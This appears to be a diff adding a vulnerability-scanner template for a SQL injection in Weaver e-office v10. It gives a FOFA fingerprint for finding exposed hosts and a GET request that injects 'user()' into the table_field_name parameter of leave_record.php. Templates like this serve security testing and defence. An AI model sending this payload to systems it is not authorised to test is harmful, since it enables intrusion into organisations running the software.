@@ -1,0 +1,24 @@
+id: e-office-v10-sql-inject
+
+info:
+  name: 泛微 eoffice v10 SQL注入
+  author: HuanXiong
+  severity: high
+  description: |
+    FOFA: fid="2csJpuWtfTdSAavIfJtuBw=="
+
+  tags: SQL Injection
+
+http:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1&table_field=1&table_field_name=user()&max_rows=10"
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<p>未找到相关数据</p>"
